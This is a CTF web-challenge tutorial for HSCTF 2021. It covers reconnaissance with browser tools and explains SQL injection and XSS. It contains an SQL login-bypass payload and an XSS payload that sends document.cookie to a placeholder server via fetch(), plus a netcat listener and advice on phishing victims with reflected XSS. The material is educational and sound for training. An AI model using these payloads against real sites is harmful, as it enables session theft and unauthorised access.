# HSCTF 2021 - Web tutorial

Author: Joakim Algrøy (jalgroy) **Disclaimer:** As always, only attack a system if you have permission to do so. Use what you learn with care.  
## Introduction

This guide is geared towards solving web challenges in CTFs, but similar techniques are used in real world penetration testing.
I'm going to explain how I approach a new web challenge. This is not necessarily the best way or the fastest, but I usually have
reasonable success using these tips, especially on the more beginner friendly challenges.

I'm only going to describe how to use the browser with it's built in tools to solve challenges, because that's (almost always) all you need for beginner challenges. Once you encounter something that seems hard or annying to do in the browser, google it! There is probably a tool to automate it. 

The steps laid out here is an approximation of my approach to web challenges in CTFs, but is in no way fixed and in reality it changes from situation to situation. If you don't know how to start however, it can be a useful guide!

## Step 1 - Be a user!

Once you have a URL, the first and obvious thing to do is to open it in the browser and look around!
This may seem obvious, but if you skip looking around and go straight to the next steps, you might
miss something obvious.

The goal in this step is to get an understanding of what the functionality of the site is, and what 
actions a user can perform. 
- What input fields and forms are there?
    - What happens when you fill them in and submit them?
- What links are there, and which other pages do they take you to?
- Think about what you would do to implement a website like this

## Step 2 - View source!

**How?**: CTRL+U, or Right click -> View source

What you're seeing here is the html content of the response from the server. Remember that this is not necessarily all the content of the current page, as it is very common these days to load content dynamically with javascript _after_ the first http response.

We are still mostly gathering information, and the source can give use some clues as to how the website works. Look at the following:

* Are there HTML comments? They look like this: `<!-- This is a comment -->`
    * Developers sometimes leave comments for themselves and forget to remove them before deployment. They can reveal useful information!
* Do you see any web frameworks mentioned?
    * For example: `<meta name="generator" content="WordPress 5.6.1" />` Tells you this page was built with WordPress version 5.6.1. Find out if there are known weaknesses in that version by googling "Wordpress 5.6.1 vulnerabilities" or just "Wordpress vulnerabilities". **In general: Google is key. No-one can keep track of every technology and it's weaknesses. See something interesting you don't recognize? Google it!**
* Look at the paths
    * Where is static content loaded from? For example if you see: `<img src="/assets/header.png">`, open /assets in the browser! Are you allowed to see the content of the directory?
    * Finding subdirectories and files with common names can be automated with tools like [dirbuster](https://tools.kali.org/web-applications/dirbuster) or [gobuster](https://github.com/OJ/gobuster). This should not be necessary in HSCTF 2021, but it's good to be aware of it.

More stuff can be found in the source, but it can be a bit tedious to read through. Let's move on to some more dynamic analysis for now.


## Step 3 - HTTP Requests! Featuring developer tools

The browser gods have given us an extremely useful tool. To unleash this power, press F12, CTRL+SHIFT+I or Right click -> Inspect element.

We're going to look at the Network tab. The network tab shows us HTTP requests and responses which is the communication between your browser and the web server. This is where I should mention that **I prefer Firefox over Chrome**. The developer tools are much more intuitive than in Chrome, and Firefox has a killer feature for CTFs called "Edit and resend". This alllows you to edit an HTTP request you already sent end resend it with the new values, and view the result in your browser. Most pro's are going to use a proxy instead, like [Burp Suite](https://portswigger.net/burp) or [ZAP](https://www.zaproxy.org/), but I find the firefox network tools can get you quite far in CTFs.

Okay, we've got the network tab open. Refresh the page and you should see one or more requests showing up. What are we looking for?

* Where are the requests going?
    * The first request should be a GET or POST to the page you're currently on
    * Which others are there?
        * Look at the type. CSS, JS, PNG, JPEG, SVG are not that interesting.
        * json and xml responses are usually from APIs, 
* Select a request and look at the headers
    * Is your browser sending cookies? (`Cookie:` header) If so, can you learn anythig from their value?
        * Cookies can be modified in the "Storage" tab of dev tools. Try to see if changing them changes the behaviour of the web page.
    * Is the server setting cookies? (`Set-Cookie:` header)
    * Is there an `Authorization` header?
        * Authorization headers are often base64 encoded. Google "base64 decoder" and see if they decode to anything interesting.
* If there is a form on the page, submit it with the network tab open, and find the POST request.
    * Look at the parameters of the request ("Request" tab). What happens if you change some of the values?
        * To modify a POST request, right click the request and choose "Edit and resend" (in Firefox).
        * Can you do something you're not supposed to by sending invalid parameters?

## Step 4 - People keep making the same mistakes: Common vulnerabilities

Ok, so know we have a good overview of how the website works, and we can start trying to lok for specific common vulnerabilities. In a lot of CTFs, you'll get a hint pointing you to a vulnerability, either in the name, description, or in the challenge itself. That means that step 4 can often be step 1, but in the real world you don't get hints like that, so you'll spend much more time on step 1-3.

For a list of common vulnerabilities, with descriptions of how they arise and how they can be fixed, check out [OWASP Top 10](https://owasp.org/www-project-top-ten/).

### SQL Injection

SQL is a language used to write to and read from SQL databases. It is, for example, used to check if a username/password combination is valid. SQL Injection is the practice of writing SQL syntax into an input field of a website, in order to modify the SQL query the server executes. Let's look at an example:

Here is a common SQL query to check if a user/password combination exists in the database

```
SELECT * FROM users WHERE username = 'admin' AND password = 'super_good_pw'
```

To run a query like that, the web service must insert the username and password you provide into the query. That can be done like so:

```
var query = "SELECT * FROM users WHERE username = '" + user + "' AND password = '" + pass + "'";
```

But, what if you set your username to be `' OR 1=1; -- `? Then, the query will look like this:

```
SELECT * FROM users WHERE username = '' OR 1=1; -- ' AND password = ''
```

And voila! Now, the query does not ask if there is a matching user/password combination, it simply asks: is 1=1? Because this is always true, the server will get a good response from the database, and will assume you entered a correct username and password. (Note, -- is syntax for a comment in SQL, we use it to ignore the rest of the query.)

More advanced stuff than `' OR 1=1; -- ` can be used to read out data from the database, or even change the contents. SQL Injection attacks can be automated with [Sqlmap](http://sqlmap.org/), but again, automated tools like that or not necessary for HSCTF 2021.


### XSS (Cross Site Scripting)

XSS is when you're able to add javascript code to an input field, and have it run in your or someon else's browser. Any time you see something you have written in an input field printed on the web page, there is a potential for an XSS.

There are two types of XSS: Stored and reflected. Stored is when your input is saved on the server and displayed on the web page permanently. Reflected is when the input is only displayed as a response to the HTTP request containing the input. Stored XSS is the more serious kind, but reflected can still be dangerous.

**Testing for XSS**

Once you've found an input field where the input is displayed on the page, the most common test is to enter something like `<script>alert('XSS')</script>`. If you see an alert with the text "XSS", you've found an XSS vulnerability! Sometimes developers try to write their own filters to stop XSS attacks, but that can be hard and it's easy to make mistakes. If you suspect there is a homebrewed XSS filter on the web page, check out OWASP's [XSS Filter Evasion Cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).

**Stealing cookies with XSS**

One of the things you can do with an XSS vulnerability is to steal cookies from other users! Cookies tend to be used to keep users logged in, which means if you can steal such a cookie you can log in as the user you stole it from! 

Some cookies have the HttpOnly flag set, which makes them unreadable by javascript, and thus you can't steal them with XSS. As a develoer you should always use the HttpOnly flag if you do not strictly need access to the cookie in javascript.

A typical way to steal a cookie is using an HTTP request to a server you control. On that server you can run some kind of collector that logs the HTTP request. That could be a full web server, or it could just be a simple netcat listener (i.e. `nc -lnvp 80`). Then, we cold use javascript fetch to send the cookie with an HTTP request. The easiest way is to add the cookie to the URL, like so:

```
<script>fetch('http://my-server-url.com/' + document.cookie)</script>
```

If you have a stored XSS, enter the above and wait for users to visit that page. If you have a reflected XSS where the script is part of the URL (meaning the XSS is in a GET parameter), you can take the resulting URL and try to [phish](https://en.wikipedia.org/wiki/Phishing) a target you know is likely to be logged in on the website in question. In a CTF, there are sometimes automated scripts that will visit any links you submit, to emulate a user that can be phished.
